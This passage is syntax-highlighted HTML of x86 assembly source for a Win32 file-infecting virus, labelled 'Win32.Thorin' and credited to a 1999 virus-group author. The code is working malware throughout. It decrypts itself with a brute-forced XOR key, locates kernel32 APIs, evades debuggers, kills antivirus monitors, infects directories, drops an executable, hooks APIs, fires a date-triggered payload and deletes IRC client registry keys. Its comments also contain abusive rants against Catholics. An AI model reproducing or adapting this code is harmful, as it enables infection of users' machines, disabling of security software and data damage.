    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">over_trap</span><span class="sc0">

</span><span class="sc5">kill_av</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">over_rda</span><span class="sc0">

</span><span class="sc5">over_trap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta</span><span class="sc0">                           </span><span class="sc1">; Hardest code to undestand ;)</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">shit_b4_delta</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00001000h</span><span class="sc0">
</span><span class="sc5">NewEIP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Save it</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                         </span><span class="sc1">; Goddamn first gen...</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">over_rda</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rda_crypt</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">over_rda</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; RDA Layer (Random Decryption Algorithm)</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; I have become a direct. I have become insurgent.</span><span class="sc0">

</span><span class="sc5">rda_crypt</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Clear counter</span><span class="sc0">
</span><span class="sc5">try_another_key</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">                           </span><span class="sc1">; Try to decrypt it</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; Save counter</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Load address to crypt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">encrypt_size</span><span class="sc0">                </span><span class="sc1">; Size to crypt</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">                           </span><span class="sc1">; Get its CRC32</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; Restore counter</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">; Actual CRC32=CRC32 unencrypted?</span><span class="sc0">
</span><span class="sc5">CRC</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">     
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">rda_done</span><span class="sc0">                        </span><span class="sc1">; Yeah, then we decrypted it</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">                           </span><span class="sc1">; Nopes, fix it</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; increase key</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">try_another_key</span><span class="sc0">                 </span><span class="sc1">; Try with another key</span><span class="sc0">
</span><span class="sc5">rda_done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">rda_crypt</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">crypt</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">                            </span><span class="sc1">; This procedures simplifies</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; the task (and optimizes) of</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">encrypt_size</span><span class="sc0">                </span><span class="sc1">; encrypt with a determinated</span><span class="sc0">
</span><span class="sc5">rda_</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">               </span><span class="sc1">; key</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rda_</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">crypt</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; Legalizar consimizion, no te konviene... se akaba el filon!</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; CRC32 calculator [by Vecna]</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;        ESI = Offset where code to calculate begins</span><span class="sc0">
</span><span class="sc1">;        EDI = Size of that code</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;        EAX = CRC32 of given code</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">CRC32</span><span class="sc0">           </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Optimized by me - 2 bytes</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; less</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0EDB8h</span><span class="sc0">
</span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextBitCRC</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Another fool byte less</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NextByteCRC</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CRC32</span><span class="sc0">           </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">crypto</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" [IAIDA] "</span><span class="sc0">                    </span><span class="sc1">; Little message to the pree-</span><span class="sc0">
                        </span><span class="sc1">; tiest girl over the earth.</span><span class="sc0">
                        </span><span class="sc1">; She deserves much more, i</span><span class="sc0">
                        </span><span class="sc1">; know... anyway... she's here!</span><span class="sc0">

</span><span class="sc1">; No penseis ke soy baboso, ein?!?!?!?!?!? :)</span><span class="sc0">

</span><span class="sc5">over_rda</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; EAX = Image Base of module</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ChangeSEH</span><span class="sc0">                       </span><span class="sc1">; SEH rlz.</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Restore stack</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RestoreSEH</span><span class="sc0">
</span><span class="sc5">ChangeSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Joder, no joderemos...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; pero ≠JODER! las ganas ke</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">                    </span><span class="sc1">; tenemos :)</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inNT</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Make zero inNT variable</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">; Check if we are under WinNT</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">WinNT</span><span class="sc0">                           </span><span class="sc1">; ECX = 0 - WinNT;100 - Win9X</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">shock</span><span class="sc0">

</span><span class="sc5">WinNT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">inNT</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; If NT, mark this</span><span class="sc0">
</span><span class="sc5">shock</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get program return address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">05d</span><span class="sc0">                         </span><span class="sc1">; Max level</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetK32</span><span class="sc0">

</span><span class="sc1">; I hate the catholicism... I HATE THE CATHOLICISM!!!! STOP HIPOCRISY!!!!!!!!</span><span class="sc0">
</span><span class="sc1">; STOP THOSE GODDAMN LIES!!! What is that? God helps us? Hahahahah!!! So, you</span><span class="sc0">
</span><span class="sc1">; stupid catholic asshole... why  there are wars, genocides, etc? Why we, the</span><span class="sc0">
</span><span class="sc1">; human race, are as cruel with other humans, the nature, and everything that</span><span class="sc0">
</span><span class="sc1">; goes againist our own process to earn money? Open your eyes... i won't make</span><span class="sc0">
</span><span class="sc1">; you change using the power... just change yourself... it's your choice.</span><span class="sc0">

</span><span class="sc5">asakopako</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; EAX must be K32 base address</span><span class="sc0">

</span><span class="sc1">; This is the main branch of the virus</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Offsetz</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Namez</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPIs</span><span class="sc0">                         </span><span class="sc1">; Retrieve all APIs</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AntiDebugger</span><span class="sc0">                    </span><span class="sc1">; Antidebug their arse</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PrepareInfection</span><span class="sc0">                </span><span class="sc1">; Set-up infection</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">KillMonitors</span><span class="sc0">                    </span><span class="sc1">; Kill AV monitors</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectItAll</span><span class="sc0">                     </span><span class="sc1">; Infect dirs</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DropPR0N</span><span class="sc0">                        </span><span class="sc1">; Unpack and drop PR0N.EXE</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TraversalSearch</span><span class="sc0">                 </span><span class="sc1">; Search for scripts and dr0p</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HookAllAPIs</span><span class="sc0">                     </span><span class="sc1">; Hook IT APIs</span><span class="sc0">

</span><span class="sc1">; Ok, we prepare to end the adventure...</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WFD_HndSize</span><span class="sc0">                     </span><span class="sc1">; Hook some mem for WFD_Handles</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">                       </span><span class="sc1">; structure</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_HndInMem</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; Activate payload every 26th of October, a magical day.</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SYSTEMTIME</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetSystemTime</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wDay</span><span class="sc4">],</span><span class="sc2">31d</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">continue_payload</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">delete_key</span><span class="sc0">

</span><span class="sc5">continue_payload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wDay</span><span class="sc4">],</span><span class="sc2">26d</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ST_wMonth</span><span class="sc4">],</span><span class="sc2">10d</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">payload</span><span class="sc0">                         </span><span class="sc1">; Well... payloads :)</span><span class="sc0">

</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; 1st gen shit</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">fakehost_</span><span class="sc0">

</span><span class="sc5">RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Restore old SEH handler</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">popfd</span><span class="sc0">                                   </span><span class="sc1">; Restore registers &amp; flags</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">; Here goes program's EIP</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">OldEIP</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00001000h</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">                   </span><span class="sc1">; And here its base address</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">ModBase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">imagebase_</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; We return control to host</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fakehost_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fakehost</span><span class="sc0">                        </span><span class="sc1">; 1st gen shitz0r</span><span class="sc0">

</span><span class="sc1">; CATHOLICISM = FASCISM = SHIT</span><span class="sc0">

</span><span class="sc5">delete_key</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; This gets executed once </span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_mIRC</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; each 2 months :)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DelReg</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_PIRCH</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DelReg</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">key_ViRC97</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DelReg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Most important virus info :)</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">vname</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"[Win32.Thorin."</span><span class="sc0">
    </span><span class="sc5">virussize</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" v1.00]"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">copyr</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Copyright (c) 1999 by Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; Obtain useful info that will be used in infection process</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">

</span><span class="sc5">PrepareInfection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WindowsDir</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Pointer to the variable</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">                             </span><span class="sc1">; Size of dir variable</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Push it!</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetWindowsDirectoryA</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">                         </span><span class="sc1">; Pointer to the variable</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">                             </span><span class="sc1">; Size of dir variable</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Push it!</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetSystemDirectoryA</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">                         </span><span class="sc1">; Pointer to the variable</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Size of dir variable</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">                             </span><span class="sc1">; Push it!</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">

